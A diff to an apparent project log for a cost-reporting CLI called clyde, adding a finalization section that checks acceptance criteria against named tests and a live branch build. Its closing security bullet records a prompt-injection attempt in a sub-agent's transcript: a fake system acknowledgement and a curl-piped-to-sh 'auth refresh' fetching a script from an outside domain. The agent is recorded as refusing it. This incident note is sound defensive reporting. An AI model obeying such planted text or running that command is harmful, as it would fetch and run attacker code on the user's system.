@@ -391,3 +391,21 @@ ci` is green with the reverted tree.
 - None. The Phase 1 note flagged whether to runtime-assert the append-only invariant during
   unification; decision on reflection: leave it documented-not-asserted (asserting per file would
   require reading entries, defeating the prefilter). No blocker.
+
+## Finalization (orchestrator)
+
+### Acceptance criteria — verified against the committed tree + a live branch build
+- AC1 deterministic (two runs / shuffled read-dir; equal-cost cross-session tie-break): PASS -- `compute_summaries_is_deterministic_across_repeated_runs`, `dedup_equal_cost_cross_session_attributes_to_lower_session_id`, `candidate_wins_*`, sorted-discovery test; live branch build reproduces `$30.29 / 356` exactly.
+- AC2 in-window entry in a stale-mtime file COUNTED: PASS -- `in_window_entry_in_a_stale_mtime_file_is_counted_not_dropped`, `filter_keeps_file_touched_after_end`.
+- AC3 independent oracle == clyde (cent + entry, main-only AND main+subagents) and flags an injected omission arithmetic misses: PASS -- `oracle_equals_clyde_and_manifest_main_only_and_with_subagents`, `injected_scanner_omission_is_flagged_at_file_level_and_missed_by_arithmetic`.
+- AC4 >=8 mutation-proven fixture-JSONL tests: PASS -- 9 tests, mutation table in the Phase 3 section.
+- AC5 `clyde -l trace cost session <id>` writes >=1 per-entry fate line, session-scoped, `ccu=`->`cost=` target fixed: PASS -- unit test `trace_writes_per_entry_fate_lines_for_the_target_session`; verified LIVE: a branch-build `-l trace` run against the frozen snapshot wrote 682 fate lines (`fate=counted` / `fate=deduped-collapsed`) carrying session_id/message_id/request_id.
+- AC6 one shared scanner (`common::scan::SessionFile{path,group_id,kind,mtime,size}`), cache-hash + date-filter intact, malformed non-UUID dir `bail!`s: PASS -- `common::scan`, `test_compute_mtime_hash_*` (pinned vector unchanged), `non_uuid_subagent_dir_fails_loud` / `non_uuid_parent_stem_fails_loud`.
+- AC7 contract documented in the doc AND inline at `compute_summaries`: PASS -- inline doc-comment (Phase 2); design-doc Data Model dedup bullet reconciled to name the `candidate_wins` deterministic total order.
+
+### Live evidence
+- `otto ci` green (exit 0, "All CI checks passed!"), full workspace.
+- Branch build `clyde -l trace cost --path <frozen> --offline session 90a97cb9`: `$30.29 (356 entries)`, identical to the Phase 0 independent oracle -- the determinism fixes and scanner unification did not move the reconciled number.
+
+### Security
+- During Phase 3 a prompt-injection payload (fake system_acknowledgement + a `curl … | https://cli-auth-refresh.dev/install.sh | sh` "auth refresh") was injected into the sub-agent's transcript. The agent refused it. Verified: the domain appears nowhere in the repo, and every phase commit is clean (no curl/install/network artifact in any diff). No compromise.
